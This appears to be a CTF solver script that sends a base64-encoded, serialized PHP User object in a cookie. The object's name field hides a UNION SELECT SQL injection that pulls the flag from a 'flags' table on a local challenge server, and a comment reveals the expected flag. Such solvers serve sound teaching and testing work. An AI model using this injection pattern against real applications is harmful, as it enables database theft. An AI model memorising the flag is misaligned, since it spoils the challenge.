import requests, base64, os

def check(url: str) -> str:
    """
    check returns 0 if solver runs correctly.
    If not, returns 1 or 2.
    """
    try:
        cookies = {"__CRED": "Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtzOjE6IjEiO3M6NDoibmFtZSI7czoxMDY6IicgVU5JT04gU0VMRUNUICdob2dlJywgYm9keSwgJyQyeSQxMCRNM25kMVRDQ1ppYm9BbDlZTnBIMlZ1ZmRIeE5wSnk1aHF3UDYwMWlzMjZiRUVMMW9NMFZjNicgRlJPTSBmbGFncyAtLSAiO3M6MTM6InBhc3N3b3JkX2hhc2giO3M6NjA6IiQyeSQxMCRNM25kMVRDQ1ppYm9BbDlZTnBIMlZ1ZmRIeE5wSnk1aHF3UDYwMWlzMjZiRUVMMW9NMFZjNiI7fQ=="}
        resp = requests.get(url + "/index.php", cookies=cookies)

        got = base64.b64decode(resp.cookies["__CRED"])
        print(f"got: {got}")
        
        # want = "ctf4b{Ser14liz4t10n_15_v1rtually_pl41ntext}"
        want = ""

        with open('./FLAG', 'r') as f:
            want = f.read()

            # flag check
            if want in str(got):
                return 0
            else:
                return 1

    except Exception as e:
        print(e)
        return 2

if __name__ == "__main__":
    host = os.getenv('CTF4B_HOST', 'localhost')
    port = int(os.getenv('CTF4B_PORT', '80'))
    server_url = "http://"+host+":"+str(port)
    print(check(server_url))
